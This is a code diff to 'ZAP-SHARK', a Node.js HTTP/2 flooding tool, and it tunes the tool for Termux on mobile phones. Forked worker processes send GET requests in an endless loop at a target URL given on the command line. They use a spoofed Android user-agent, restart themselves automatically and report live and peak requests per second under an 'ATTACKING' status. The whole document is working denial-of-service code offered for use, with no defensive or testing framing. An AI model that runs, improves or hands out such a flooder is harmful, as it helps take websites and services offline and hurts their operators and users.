@@ -16,8 +16,8 @@ class ZAPSHARK {
         this.lastRpsCalc = Date.now();
         this.running = true;
         
-        // Performance tuning
-        this.concurrency = Math.max(1, Math.min(numCPUs, 4)); // Optimized for mobile/desktop
+        // Performance tuning - optimized for Termux/mobile
+        this.concurrency = Math.max(1, Math.min(numCPUs, 2)); // Conservative for mobile
         this.workers = [];
         
         // Maintenance
@@ -32,9 +32,9 @@ class ZAPSHARK {
     createAttackWorker() {
         if (cluster.isWorker) {
             const client = http2.connect(process.env.TARGET_URL, {
-                maxSessionMemory: 16384,
-                maxDeflateDynamicTableSize: 4096,
-                maxSettings: 1024
+                maxSessionMemory: 8192,  // Reduced for mobile
+                maxDeflateDynamicTableSize: 2048,
+                peerMaxConcurrentStreams: 100
             });
 
             let requests = 0;
@@ -51,7 +51,7 @@ class ZAPSHARK {
                         const req = client.request({ 
                             ':method': 'GET', 
                             ':path': '/',
-                            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
+                            'user-agent': 'Mozilla/5.0 (Linux; Android 10; Mobile) AppleWebKit/537.36'
                         });
                         
                         req.on('response', () => {
@@ -64,30 +64,31 @@ class ZAPSHARK {
                             req.destroy();
                         });
                         
+                        req.on('close', () => {
+                            // Immediate next request
+                            setImmediate(attack);
+                        });
+                        
                         req.end();
                         
-                        // MAX SPEED - minimal setImmediate for event loop
-                        if (Math.random() > 0.99) {
-                            setImmediate(attack);
-                        } else {
-                            attack();
-                        }
                     } catch (err) {
                         requests++;
                         setImmediate(attack);
                     }
                 };
                 
+                // Start attack loop
                 attack();
             });
 
             client.on('error', () => {
-                setTimeout(() => process.exit(1), 1000);
+                // Silent reconnect
+                setTimeout(() => process.exit(1), 500);
             });
 
             process.on('disconnect', () => {
                 clearInterval(reportInterval);
-                client.destroy();
+                try { client.destroy(); } catch(e) {}
                 process.exit(0);
             });
         }
@@ -99,7 +100,7 @@ class ZAPSHARK {
         console.log(`🎯 Target: ${this.targetUrl}`);
         console.log(`⚡ Workers: ${this.concurrency}`);
         console.log(`💻 CPU Cores: ${numCPUs}`);
-        console.log(`📱 Optimized: Mobile & Desktop`);
+        console.log(`📱 Optimized: Termux/Mobile`);
         console.log('='.repeat(50));
 
         // Fork workers
@@ -113,24 +114,26 @@ class ZAPSHARK {
                 this.requestsSinceLastCalc += msg.requests;
             });
             
-            worker.on('exit', () => {
+            worker.on('exit', (code, signal) => {
+                // Auto-restart worker
                 setTimeout(() => {
-                    cluster.fork({ TARGET_URL: this.targetUrl });
-                }, 1000);
+                    if (this.running) {
+                        cluster.fork({ TARGET_URL: this.targetUrl });
+                    }
+                }, 100);
             });
-            
-            this.workers.push(worker);
         }
 
         this.startStats();
         this.startMaintenanceCycle();
+        this.setupControls();
     }
 
     calculateRPS() {
         const now = Date.now();
         const timeDiff = (now - this.lastRpsCalc) / 1000;
         
-        if (timeDiff >= 0.5) { // Faster updates
+        if (timeDiff >= 0.5) {
             this.currentRPS = this.requestsSinceLastCalc / timeDiff;
             this.peakRPS = Math.max(this.peakRPS, this.currentRPS);
             this.requestsSinceLastCalc = 0;
@@ -151,27 +154,22 @@ class ZAPSHARK {
         
         const memory = process.memoryUsage();
         const memUsage = (memory.heapUsed / 1024 / 1024).toFixed(1);
+        const activeWorkers = Object.keys(cluster.workers || {}).length;
         
         process.stdout.write(`\r🦈 ZAP-SHARK: [${this.formatRuntime()}] | ${this.status} | ` +
                            `REQS: ${this.totalRequests.toLocaleString()} | ` +
-                           `LIVE: ${this.currentRPS.toFixed(0)}/s | ` +
+                           `RPS: ${this.currentRPS.toFixed(0)}/s | ` +
                            `PEAK: ${this.peakRPS.toFixed(0)}/s | ` +
                            `MEM: ${memUsage}MB | ` +
-                           `WORKERS: ${Object.keys(cluster.workers || {}).length}`);
+                           `WORKERS: ${activeWorkers}/${this.concurrency}`);
     }
 
     flushDNS() {
-        const cmds = {
-            'win32': 'ipconfig /flushdns',
-            'darwin': 'dscacheutil -flushcache; sudo killall -HUP mDNSResponder',
-            'linux': 'sudo systemd-resolve --flush-caches 2>/dev/null || sudo /etc/init.d/nscd restart 2>/dev/null'
-        };
-        exec(cmds[os.platform()] || 'echo "DNS flush"', () => {});
+        // Termux-compatible DNS flush
+        exec('pkill -HUP dnsmasq 2>/dev/null || pkill -HUP systemd-resolve 2>/dev/null', () => {});
     }
 
     flushSockets() {
-        exec('sudo sysctl -w net.ipv4.tcp_tw_reuse=1 2>/dev/null', () => {});
-        
         // Restart workers for clean sockets
         for (const id in cluster.workers) {
             cluster.workers[id].kill();
@@ -181,7 +179,7 @@ class ZAPSHARK {
     startMaintenanceCycle() {
         setInterval(() => {
             this.checkMaintenance();
-        }, 5000); // Check every 5 seconds
+        }, 5000);
     }
 
     checkMaintenance() {
@@ -209,14 +207,35 @@ class ZAPSHARK {
         }, 100);
     }
 
+    setupControls() {
+        // Keyboard controls for Termux
+        if (process.stdin.isTTY) {
+            process.stdin.setRawMode(true);
+            process.stdin.resume();
+            process.stdin.setEncoding('utf8');
+            
+            process.stdin.on('data', (key) => {
+                // Ctrl+C or 'q' to quit
+                if (key === '\u0003' || key === 'q') {
+                    this.stop();
+                }
+                // 'p' to pause/resume
+                if (key === 'p') {
+                    this.status = this.status === "ATTACKING" ? "PAUSED" : "ATTACKING";
+                    console.log(`\n\n⏸️  STATUS: ${this.status}`);
+                }
+                // 'r' to restart workers
+                if (key === 'r') {
+                    console.log('\n\n🔄 RESTARTING WORKERS...');
+                    this.flushSockets();
+                }
+            });
+        }
+    }
+
     async start() {
         if (cluster.isMaster) {
             this.startMaster();
-            
-            // Handle exit gracefully
-            process.on('SIGINT', () => this.stop());
-            process.on('SIGTERM', () => this.stop());
-            
         } else {
             this.createAttackWorker();
         }
@@ -242,22 +261,26 @@ class ZAPSHARK {
             console.log(`   Runtime: ${this.formatRuntime()}`);
             console.log('🎯 ZAP-SHARK TERMINATED');
             process.exit(0);
-        }, 1000);
+        }, 500);
     }
 }
 
-// Auto-detect and optimize
-const target = process.argv[2] || 'https://example.com';
+// Performance optimizations for Termux
+process.env.UV_THREADPOOL_SIZE = Math.min(128, os.cpus().length * 4);
 
-if (!target.startsWith('https://')) {
-    console.log('❌ ERROR: Use HTTPS target for HTTP/2');
-    console.log('💡 Usage: node zap-shark.js https://target.com');
+const target = process.argv[2];
+if (!target) {
+    console.log('❌ ERROR: Please provide target URL');
+    console.log('💡 Usage: node shark.js https://target.com');
     process.exit(1);
 }
 
-// Performance optimizations
-process.env.UV_THREADPOOL_SIZE = 128;
-require('http2').setMaxListeners(100);
+if (!target.startsWith('https://')) {
+    console.log('❌ ERROR: Use HTTPS target for HTTP/2');
+    process.exit(1);
+}
 
 const shark = new ZAPSHARK(target);
-shark.start().catch(console.error);
+shark.start().catch(err => {
+    console.log('Startup error:', err.message);
+});
